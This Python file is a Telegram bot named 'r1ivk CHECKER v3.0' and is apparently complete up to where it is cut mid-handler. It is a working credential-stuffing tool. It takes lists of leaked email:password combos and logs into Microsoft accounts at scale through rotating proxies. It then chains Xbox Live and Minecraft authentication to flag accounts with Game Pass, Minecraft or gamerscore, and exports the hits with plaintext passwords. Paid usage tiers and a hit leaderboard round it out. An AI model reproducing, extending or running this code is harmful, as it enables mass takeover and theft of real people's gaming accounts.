# -*- coding: utf-8 -*-
"""
r1ivk CHECKER v3.0 - Telegram ULTIMATE Edition
Owner: r1ivk
"""

import os
import re
import io
import json
import time
import sqlite3
import logging
import zipfile
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import telebot
from telebot import types

urllib3.disable_warnings()

# =================== LOGGER ===================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)
log = logging.getLogger("r1ivk")

# =================== CONFIG ===================
# Read from environment for safety; fallback to placeholder
BOT_TOKEN = os.environ.get("BOT_TOKEN", "PUT_YOUR_TOKEN_HERE")
OWNER_ID  = int(os.environ.get("OWNER_ID", "6266959915"))
ADMIN_IDS = []                              # extra admin chat ids
RESULTS_DIR = "XBOX_RESULT"
DB_FILE     = "r1ivk_checker.db"

REQUEST_TIMEOUT  = 25
MAX_THREADS      = 50
FREE_DAILY_LIMIT = 100
PRO_DAILY_LIMIT  = 10000
VIP_DAILY_LIMIT  = 999999

os.makedirs(RESULTS_DIR, exist_ok=True)

# =================== BOT ===================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# =================== DATABASE ===================
def db_init():
    con = sqlite3.connect(DB_FILE, check_same_thread=False)
    cur = con.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            chat_id     INTEGER PRIMARY KEY,
            username    TEXT,
            role        TEXT DEFAULT 'free',
            daily_used  INTEGER DEFAULT 0,
            last_reset  TEXT,
            total_hits  INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            joined      TEXT
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id     INTEGER,
            started     TEXT,
            finished    TEXT,
            total       INTEGER,
            checked     INTEGER,
            hits        INTEGER,
            gamepass    INTEGER,
            minecraft   INTEGER,
            gscore      INTEGER,
            bad         INTEGER,
            twofa       INTEGER,
            errors      INTEGER
        )
    """)
    cur.execute("""
        CREATE TABLE IF NOT EXISTS audit (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id     INTEGER,
            action      TEXT,
            ts          TEXT
        )
    """)
    con.commit()
    return con

DB = db_init()
DB_LOCK = threading.Lock()

def db_get_user(chat_id, username=None):
    with DB_LOCK:
        cur = DB.cursor()
        cur.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
        row = cur.fetchone()
        today = datetime.utcnow().strftime("%Y-%m-%d")
        if not row:
            cur.execute("""INSERT INTO users
                (chat_id, username, role, daily_used, last_reset,
                 total_hits, total_checks, joined)
                VALUES (?, ?, 'free', 0, ?, 0, 0, ?)""",
                (chat_id, username or "", today, datetime.utcnow().isoformat()))
            DB.commit()
            cur.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
            row = cur.fetchone()
        else:
            if row[4] != today:
                cur.execute("UPDATE users SET daily_used=0, last_reset=? WHERE chat_id=?",
                            (today, chat_id))
                DB.commit()
                cur.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
                row = cur.fetchone()
        return {
            "chat_id": row[0], "username": row[1], "role": row[2],
            "daily_used": row[3], "last_reset": row[4],
            "total_hits": row[5], "total_checks": row[6], "joined": row[7]
        }

def db_add_usage(chat_id, checks=0, hits=0):
    with DB_LOCK:
        cur = DB.cursor()
        cur.execute("""UPDATE users SET daily_used=daily_used+?,
                       total_checks=total_checks+?, total_hits=total_hits+?
                       WHERE chat_id=?""",
                    (checks, checks, hits, chat_id))
        DB.commit()

def db_set_role(chat_id, role):
    with DB_LOCK:
        cur = DB.cursor()
        cur.execute("UPDATE users SET role=? WHERE chat_id=?", (role, chat_id))
        DB.commit()

def db_save_session(s):
    with DB_LOCK:
        cur = DB.cursor()
        cur.execute("""INSERT INTO sessions
            (chat_id, started, finished, total, checked, hits, gamepass,
             minecraft, gscore, bad, twofa, errors)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (s["chat_id"], s["started_iso"], datetime.utcnow().isoformat(),
             s["total"], s["checked"], s["hits"], s["gamepass"], s["minecraft"],
             s["gscore"], s["bad"], s["twofa"], s["errors"]))
        DB.commit()

def db_audit(chat_id, action):
    with DB_LOCK:
        cur = DB.cursor()
        cur.execute("INSERT INTO audit (chat_id, action, ts) VALUES (?, ?, ?)",
                    (chat_id, action, datetime.utcnow().isoformat()))
        DB.commit()

def db_leaderboard():
    with DB_LOCK:
        cur = DB.cursor()
        cur.execute("""SELECT username, chat_id, total_hits, total_checks, role
                       FROM users ORDER BY total_hits DESC LIMIT 10""")
        return cur.fetchall()

def daily_limit_for(role):
    if role == "vip":   return VIP_DAILY_LIMIT
    if role == "pro":   return PRO_DAILY_LIMIT
    if role in ("admin", "owner"): return VIP_DAILY_LIMIT
    return FREE_DAILY_LIMIT

def is_admin(chat_id):
    return chat_id == OWNER_ID or chat_id in ADMIN_IDS

def get_role(chat_id):
    if chat_id == OWNER_ID: return "owner"
    u = db_get_user(chat_id)
    return u["role"]

# =================== PROXY POOL ===================
class ProxyPool:
    def __init__(self, proxies=None):
        self.proxies = proxies or []
        self.idx = 0
        self.lock = threading.Lock()
    def get(self):
        if not self.proxies: return None
        with self.lock:
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return {"http": p, "https": p}

# =================== SESSIONS ===================
user_sessions = {}
sessions_lock = threading.Lock()

HIT_FILES = {
    "gamepass":  os.path.join(RESULTS_DIR, "GamePass_Hits.txt"),
    "minecraft": os.path.join(RESULTS_DIR, "Minecraft_Hits.txt"),
    "gscore":    os.path.join(RESULTS_DIR, "GScore_Hits.txt"),
}

def new_session(chat_id):
    return {
        "chat_id": chat_id, "is_running": False,
        "checked": 0, "total": 0,
        "hits": 0, "bad": 0, "twofa": 0, "errors": 0,
        "gamepass": 0, "minecraft": 0, "gscore": 0,
        "start_time": 0, "started_iso": "",
        "hits_buffer": [], "last_update": 0, "status_msg_id": None,
        "lock": threading.Lock(),
        "stop_flag": False, "paused": False,
        "proxy_pool": None, "notified_ultimate": False,
    }

def get_session(chat_id):
    with sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = new_session(chat_id)
        return user_sessions[chat_id]

# =================== TOKEN EXTRACTORS ===================
def extract_ppft(text):
    for p in [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
    ]:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
    return None

def extract_url_post(text):
    for p in [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
        r'action="([^"]+)"[^>]*id="fmHF"',
    ]:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).replace('\\/', '/')
    return None

# =================== COMBO PARSER ===================
COMBO_RE = re.compile(r'^([^\s:]+@[^\s:]+|[^\s:]+)[:\|](.+)$')

def parse_combo(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    m = COMBO_RE.match(line)
    if not m:
        return None
    email = m.group(1).strip()
    password = m.group(2).strip()
    if not email or not password:
        return None
    return f"{email}:{password}"

def dedupe_combos(lines):
    seen = set()
    out = []
    for l in lines:
        c = parse_combo(l)
        if not c: continue
        email = c.split(":")[0].lower()
        if email in seen: continue
        seen.add(email)
        out.append(c)
    return out

# =================== CORE CHECKER ===================
def check_account(combo, chat_id):
    s = get_session(chat_id)
    if s["stop_flag"]:
        return
    while s["paused"] and not s["stop_flag"]:
        time.sleep(1)

    parts = combo.split(':')
    if len(parts) < 2:
        with s["lock"]:
            s["bad"] += 1; s["checked"] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()

    for attempt in range(2):
        if s["stop_flag"]: return

        session = requests.Session()
        session.verify = False
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

        proxy = s["proxy_pool"].get() if s["proxy_pool"] else None

        try:
            sftag_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch&response_type=token&locale=en"
            )
            resp = session.get(sftag_url, timeout=REQUEST_TIMEOUT, proxies=proxy)
            text = resp.text

            sftag = extract_ppft(text)
            url_post = extract_url_post(text)
            if not sftag or not url_post:
                with s["lock"]:
                    s["bad"] += 1; s["checked"] += 1
                session.close(); return

            login_data = {
                'login': email, 'loginfmt': email, 'passwd': password,
                'PPFT': sftag, 'type': '11', 'NewUser': '1',
                'LoginOptions': '3', 'i19': '0',
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded',
                       'Referer': sftag_url, 'Origin': 'https://login.live.com'}
            login_req = session.post(url_post, data=login_data, headers=headers,
                                     allow_redirects=True, timeout=REQUEST_TIMEOUT,
                                     proxies=proxy)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif 'access_token' in login_text:
                tm = re.search(r'access_token=([^&\s\"\']+)', login_text)
                if tm: ms_token = tm.group(1)
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist",
                                               "passwords don't match", "that password is incorrect"]):
                with s["lock"]:
                    s["bad"] += 1; s["checked"] += 1
                session.close(); return
            elif any(x in login_text for x in ["recover", "identity/confirm", "locked",
                                               "help us protect", "verify your identity",
                                               "security challenge", "two-step"]):
                with s["lock"]:
                    s["twofa"] += 1; s["checked"] += 1
                session.close(); return

            if not ms_token:
                with s["lock"]:
                    s["bad"] += 1; s["checked"] += 1
                session.close(); return

            xb_payload = {"Properties": {"AuthMethod": "RPS",
                                         "SiteName": "user.auth.xboxlive.com",
                                         "RpsTicket": ms_token},
                          "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                  json=xb_payload, headers=xb_headers,
                                  timeout=REQUEST_TIMEOUT, proxies=proxy)
            if xb_req.status_code != 200:
                raise Exception("Xbox Auth Error")

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            gamertag, gamerscore, gscore_int = "N/A", "0", 0
            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                                   "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                           json=xsts_xb_payload, headers=xb_headers,
                                           timeout=REQUEST_TIMEOUT, proxies=proxy)
                if xsts_xb_req.status_code == 200:
                    t = xsts_xb_req.json()['Token']
                    prof = session.get(
                        "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                        headers={"Authorization": f"XBL3.0 x={uhs};{t}",
                                 "x-xbl-contract-version": "2"},
                        timeout=REQUEST_TIMEOUT, proxies=proxy)
                    if prof.status_code == 200:
                        for st in prof.json().get('profileUsers', [{}])[0].get('settings', []):
                            if st['id'] == 'Gamertag': gamertag = st['value']
                            if st['id'] == 'Gamerscore':
                                gamerscore = st['value']
                                try: gscore_int = int(gamerscore)
                                except: gscore_int = 0
            except: pass

            has_gp, has_mc, gp_type, mc_ent_text = False, False, "", ""
            try:
                xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
                                   "RelyingParty": "rp://api.minecraftservices.com/",
                                   "TokenType": "JWT"}
                xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                           json=xsts_mc_payload, headers=xb_headers,
                                           timeout=REQUEST_TIMEOUT, proxies=proxy)
                if xsts_mc_req.status_code == 200:
                    t = xsts_mc_req.json()['Token']
                    mc_auth = session.post(
                        'https://api.minecraftservices.com/authentication/login_with_xbox',
                        json={'identityToken': f"XBL3.0 x={uhs};{t}"},
                        headers={'Content-Type': 'application/json'},
                        timeout=REQUEST_TIMEOUT, proxies=proxy)
                    if mc_auth.status_code == 200:
                        mt = mc_auth.json().get('access_token')
                        if mt:
                            ent = session.get(
                                'https://api.minecraftservices.com/entitlements/mcstore',
                                headers={'Authorization': f'Bearer {mt}'},
                                timeout=REQUEST_TIMEOUT, proxies=proxy)
                            if ent.status_code == 200:
                                mc_ent_text = ent.text
            except: pass

            if 'product_game_pass_ultimate' in mc_ent_text:
                gp_type, has_gp = "Game Pass Ultimate", True
            elif 'product_game_pass_pc' in mc_ent_text:
                gp_type, has_gp = "PC Game Pass", True
            elif 'product_game_pass_console' in mc_ent_text:
                gp_type, has_gp = "Xbox Game Pass Console", True
            has_mc = 'product_minecraft' in mc_ent_text

            hit_content = (
                f"Email: {email}\n"
                f"Password: {password}\n"
                f"Gamertag: {gamertag}\n"
                f"Gamerscore: {gamerscore}\n"
                f"Minecraft: {'Yes' if has_mc else 'No'}\n"
                f"Game Pass: {gp_type if has_gp else 'No'}"
            )

            with s["lock"]:
                if has_gp:
                    s["gamepass"] += 1; s["hits"] += 1
                    s["hits_buffer"].append(("gamepass", hit_content))
                    if gp_type == "Game Pass Ultimate" and not s["notified_ultimate"]:
                        s["notified_ultimate"] = True
                        try:
                            bot.send_message(
                                s["chat_id"],
                                f"🔥🔥 *ULTIMATE HIT!* 🔥🔥\n```\n{hit_content}\n```")
                        except: pass
                elif has_mc:
                    s["minecraft"] += 1; s["hits"] += 1
                    s["hits_buffer"].append(("minecraft", hit_content))
                elif gscore_int > 0:
                    s["gscore"] += 1; s["hits"] += 1
                    s["hits_buffer"].append(("gscore", hit_content))
                else:
                    s["bad"] += 1
                s["checked"] += 1

            session.close()
            return

        except requests.exceptions.RequestException:
            time.sleep(1)
        except Exception:
            time.sleep(0.5)
        finally:
            try: session.close()
            except: pass

    with s["lock"]:
        s["errors"] += 1; s["checked"] += 1

# =================== LIVE SCANNER ===================
def live_scanner(chat_id, combos, threads=30):
    s = get_session(chat_id)
    s["stop_flag"] = False
    s["paused"] = False

    for f in HIT_FILES.values():
        try: open(f, "w").close()
        except: pass

    q_lock = threading.Lock()
    idx = {"i": 0}

    def worker():
        while True:
            with q_lock:
                if s["stop_flag"] or idx["i"] >= len(combos):
                    return
                combo = combos[idx["i"]]
                idx["i"] += 1
            check_account(combo, chat_id)

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in workers: t.start()

    last_render = 0
    while any(t.is_alive() for t in workers):
        if s["stop_flag"]: break
        if time.time() - last_render >= 4:
            render_status(chat_id)
            last_render = time.time()
        time.sleep(1)

    for t in workers: t.join(timeout=1)
    s["is_running"] = False
    render_status(chat_id, final=True)
    db_save_session(s)
    db_add_usage(chat_id, checks=s["checked"], hits=s["hits"])

    try:
        summary = (
            f"🏁 *r1ivk CHECKER — FINAL REPORT*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Checked: `{s['checked']}/{s['total']}`\n"
            f"✅ Hits: `{s['hits']}`\n"
            f"🎮 GamePass: `{s['gamepass']}`\n"
            f"⛏ Minecraft: `{s['minecraft']}`\n"
            f"🏆 G-Score: `{s['gscore']}`\n"
            f"❌ Bad: `{s['bad']}`\n"
            f"🔒 2FA: `{s['twofa']}`\n"
            f"⚠️ Errors: `{s['errors']}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Use /hits to receive files 📤"
        )
        bot.send_message(chat_id, summary)
    except: pass


def render_status(chat_id, final=False):
    s = get_session(chat_id)
    elapsed = time.time() - s["start_time"] if s["start_time"] else 1
    cpm = int((s["checked"] / elapsed) * 60) if elapsed > 2 else 0
    pct = (s["checked"] / s["total"] * 100) if s["total"] else 0
    bar = "█" * int(pct / 5) + "░" * (20 - int(pct / 5))

    text = (
        f"⚡ *r1ivk CHECKER v3* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Progress: `{s['checked']}/{s['total']}`\n"
        f"`[{bar}]` *{pct:.1f}%*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Hits: `{s['hits']}`\n"
        f"🎮 GamePass: `{s['gamepass']}`\n"
        f"⛏ Minecraft: `{s['minecraft']}`\n"
        f"🏆 G-Score: `{s['gscore']}`\n"
        f"❌ Bad: `{s['bad']}`\n"
        f"🔒 2FA: `{s['twofa']}`\n"
        f"⚠️ Errors: `{s['errors']}`\n"
        f"🚀 CPM: `{cpm}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{'🏁 Finished!' if final else '⏳ Running...'}"
    )
    kb = None
    if not final:
        kb = types.InlineKeyboardMarkup(row_width=3)
        kb.add(
            types.InlineKeyboardButton("⏸ Pause", callback_data="pause"),
            types.InlineKeyboardButton("▶ Resume", callback_data="resume"),
            types.InlineKeyboardButton("🛑 Stop", callback_data="stop"),
        )
    try:
        if s["status_msg_id"]:
            bot.edit_message_text(text, chat_id, s["status_msg_id"], reply_markup=kb)
        else:
            m = bot.send_message(chat_id, text, reply_markup=kb)
            s["status_msg_id"] = m.message_id
    except: pass

# =================== EXPORT ===================
def export_txt(s):
    buf = io.StringIO()
    for t, c in s["hits_buffer"]:
        buf.write(f"[{t.upper()}]\n{c}\n{'_'*57}\n")
    return buf.getvalue().encode("utf-8")

def export_json(s):
    data = [{"type": t, "content": c} for t, c in s["hits_buffer"]]
    return json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8")

def export_xlsx(s):
    try:
        from openpyxl import Workbook
    except:
        return None
    wb = Workbook()
    ws = wb.active
    ws.title = "Hits"
    ws.append(["Type", "Email", "Password", "Gamertag",
               "Gamerscore", "Minecraft", "Game Pass"])
    for t, c in s["hits_buffer"]:
        d = dict(re.findall(r'(.+?): (.+)', c))
        ws.append([
            t, d.get("Email", ""), d.get("Password", ""), d.get("Gamertag", ""),
            d.get("Gamerscore", ""), d.get("Minecraft", ""), d.get("Game Pass", ""),
        ])
    bio = io.BytesIO()
    wb.save(bio); bio.seek(0)
    return bio.read()

def export_zip(s):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("hits.txt", export_txt(s))
        z.writestr("hits.json", export_json(s))
        xlsx = export_xlsx(s)
        if xlsx: z.writestr("hits.xlsx", xlsx)
    bio.seek(0)
    return bio.read()

# =================== KEYBOARDS ===================
def main_menu_kb(chat_id):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("📁 Scan File", "📝 Single Combo")
    kb.add("📊 My Stats", "🏆 Leaderboard")
    kb.add("📤 Get Hits", "ℹ️ Help")
    if is_admin(chat_id):
        kb.add("👑 Admin Panel")
    return kb

# =================== HANDLERS ===================
@bot.message_handler(commands=['start'])
def cmd_start(msg):
    chat_id = msg.chat.id
    u = db_get_user(chat_id, msg.from_user.username)
    db_audit(chat_id, "start")
    role = get_role(chat_id)
    limit = daily_limit_for(role)
    txt = (
        f"⚡ *r1ivk CHECKER v3.0 — ULTIMATE* ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Username: @{msg.from_user.username or 'N/A'}\n"
        f"🎭 Role: `{role.upper()}`\n"
        f"📊 Daily Used: `{u['daily_used']}/{limit if limit < 999999 else '∞'}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔹 *Commands:*\n"
        f"`/check email:pass` — Check a single combo\n"
        f"`/file` — Upload combo file (Live Scan)\n"
        f"`/stop` — Stop scanning\n"
        f"`/pause` `/resume` — Pause / Resume\n"
        f"`/stats` — Your statistics\n"
        f"`/leaderboard` — Top 10 users\n"
        f"`/hits` — Receive hits files\n"
        f"`/export` — ZIP (TXT + JSON + Excel)\n"
        f"`/reset` — Reset session\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 Owner: r1ivk"
    )
    bot.send_message(chat_id, txt, reply_markup=main_menu_kb(chat_id))

@bot.message_handler(commands=['help'])
def cmd_help(msg):
    cmd_start(msg)

@bot.message_handler(func=lambda m: m.text == "ℹ️ Help")
def help_btn(msg):
    cmd_start(msg)

@bot.message_handler(func=lambda m: m.text in ("📁 Scan File", "📝 Single Combo"))
def guide(msg):
    if msg.text == "📁 Scan File":
        bot.reply_to(msg, "📁 Send a `.txt` combo file (one account per line)")
    else:
        bot.reply_to(msg, "📝 Send: `/check email:pass`")

@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
def btn_stats(msg):
    cmd_stats(msg)

@bot.message_handler(func=lambda m: m.text == "🏆 Leaderboard")
def btn_lb(msg):
    cmd_leaderboard(msg)

@bot.message_handler(func=lambda m: m.text == "📤 Get Hits")
def btn_hits(msg):
    cmd_hits(msg)

@bot.message_handler(func=lambda m: m.text == "👑 Admin Panel")
def btn_admin(msg):
    cmd_admin(msg)

@bot.message_handler(commands=['check'])
def cmd_check(msg):
    chat_id = msg.chat.id
    u = db_get_user(chat_id)
    role = get_role(chat_id)
    limit = daily_limit_for(role)
    if u["daily_used"] >= limit and not is_admin(chat_id):
        bot.reply_to(msg, f"⛔ Daily limit reached ({limit}). Upgrade or wait until tomorrow.")
        return

    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(msg, "❌ Usage: `/check email:pass`")
        return
    combo = parse_combo(args[1])
    if not combo:
        bot.reply_to(msg, "❌ Invalid format")
        return

    s = get_session(chat_id)
    s.update({"stop_flag": False, "paused": False, "is_running": True,
              "start_time": time.time(),
              "started_iso": datetime.utcnow().isoformat(),
              "total": 1, "checked": 0, "hits": 0, "bad": 0, "twofa": 0,
              "errors": 0, "gamepass": 0, "minecraft": 0, "gscore": 0,
              "hits_buffer": [], "status_msg_id": None,
              "notified_ultimate": False})
    threading.Thread(target=live_scanner, args=(chat_id, [combo], 1), daemon=True).start()

@bot.message_handler(commands=['file'])
def cmd_file(msg):
    bot.reply_to(msg, "📁 Send the combo file (.txt) now")

@bot.message_handler(content_types=['document'])
def handle_doc(msg):
    chat_id = msg.chat.id
    u = db_get_user(chat_id)
    role = get_role(chat_id)
    limit = daily_limit_for(role)

    if not msg.document.file_name.lower().endswith(('.txt', '.csv')):
        bot.reply_to(msg, "❌ File must be text (.txt or .csv)")
        return

    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
    except Exception as e:
        bot.reply_to(msg, f"❌ Failed to download file: {e}")
        return

    combos = dedupe_combos(data.splitlines())
    if not combos:
        bot.reply_to(msg, "❌ File is empty or invalid")
        return

    allowed = limit - u["daily_used"]
    if not is_admin(chat_id) and len(combos) > allowed:
        combos = combos[:allowed]
        bot.reply_to(msg, f"⚠️ File trimmed to daily limit ({allowed}).")

    s = get_session(chat_id)
    s.update({"stop_flag": False, "paused": False, "is_running": True,
              "start_time": time.time(),
              "started_iso": datetime.utcnow().isoformat(),
              "total": len(combos), "checked": 0, "hits": 0, "bad": 0,
              "twofa": 0, "errors": 0, "gamepass": 0, "minecraft": 0,
              "gscore": 0, "hits_buffer": [], "status_msg_id": None,
              "notified_ultimate": False})

    bot.reply_to(msg, f"🚀 *Scan started* — `{len(combos)}` combos\n"
                      f"Use /stop to cancel, /pause to pause.")

    threading.Thread(target=live_scanner,
                     args=(chat_id, combos, MAX_THREADS),
                     daemon=True).start()


@bot.message_handler(commands=['stop'])
def cmd_stop(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    if not s["is_running"]:
        bot.reply_to(msg, "⚠️ No scan running.")
        return
    s["stop_flag"] = True
    s["is_running"] = False
    db_audit(chat_id, "stop")
    bot.reply_to(msg, "🛑 *Scan stopped.*")

@bot.message_handler(commands=['pause'])
def cmd_pause(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    if not s["is_running"]:
        bot.reply_to(msg, "⚠️ No scan running.")
        return
    s["paused"] = True
    bot.reply_to(msg, "⏸ *Paused.*")

@bot.message_handler(commands=['resume'])
def cmd_resume(msg):
    chat_id = msg.chat.id
    s = get_session(chat_id)
    if not s["is_running"]:
        bot.reply_to(msg, "⚠️ No scan running
